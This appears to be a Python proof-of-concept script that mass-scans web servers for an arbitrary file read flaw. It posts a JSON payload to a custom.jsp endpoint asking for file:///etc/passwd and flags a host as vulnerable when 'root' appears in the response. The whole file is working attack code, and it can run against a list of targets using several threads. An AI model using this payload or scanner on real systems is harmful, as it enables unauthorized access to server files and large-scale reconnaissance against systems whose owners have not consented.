#!/usr/bin/env python3
# -*- coding: utf-8 -*

"""
@Author: Noel
@Emai: noleisfresher@163.com 
@Date: 2021/10/17
@LastEditTime: 2021/10/17
"""
# ---------------------------------------------------------


import sys
import requests
import argparse
import threading
from queue import Queue


PATH = "/sys/ui/extend/varkind/custom.jsp"
DATA = 'var={"body":{"file":"file:///etc/passwd"}}'
GREEN = "\033[0;32;40m"
END = "\033[0m"


def parse_args():
	"""
	Command line options
	"""
	parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u http://www.vulnsite.com")
	parser.add_argument("-u","--url", help="Target url")
	parser.add_argument("-f", "--file", help="The file contains test urls")
	parser.add_argument("-t", "--thread", help="How many threads to run.Default 5")
	return parser.parse_args()


def poc(url):
	poc_url = url + PATH
	try:
		response = requests.post(url=poc_url, data=DATA,  headers ={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
				}
			)
		if response.status_code == 200 and 'root' in response.text:
			print(GREEN + f"[+] {url} is vulnerability" + END)
		else:
			print(f"[-] {url} no vulner...")
	except :
		pass


def exp(url):
	poc(url)


def one_target(url):
	"""
	@description    :  Only test one url if vulnerability
	---------
	@param  url:  Witch url you want to poc
	---------
	@return    :  
	---------
	"""
	poc(url)

def thread_run(queue):
	while not queue.empty():
		url = queue.get()
		poc(url)

def file_target(filename):
	"""
	@description    :  read urls form file into url_queue
	---------
	@param  : filename: file with urls 
	---------
	@return    : Return a Queue with urls 
	---------
	"""
	
	file_obj = open(filename, "r", encoding="utf-8")
	urls_content = file_obj.readlines()
	urls_queue = Queue()
	for i in urls_content:
		urls_queue.put(i.strip())

	file_obj.close()
	return urls_queue


if __name__ == '__main__':
	args = parse_args()
	if args.file == None and args.url ==None:
		sys.exit("Example: \r\npython" + sys.argv[0] + " -u http://www.vulnsite.com\r\n or use -h option to show more options")
	elif args.url != None and args.file ==None:
		url = args.url
		poc(url)
	elif args.url ==None and args.file != None:
		filename = args.file
		urls_queue = file_target(filename)
		THREAD_NUM = args.thread if args.thread != None else 5
		for i in range(int(THREAD_NUM)):
			t = threading.Thread(target=thread_run, args=(urls_queue,))
			t.start()
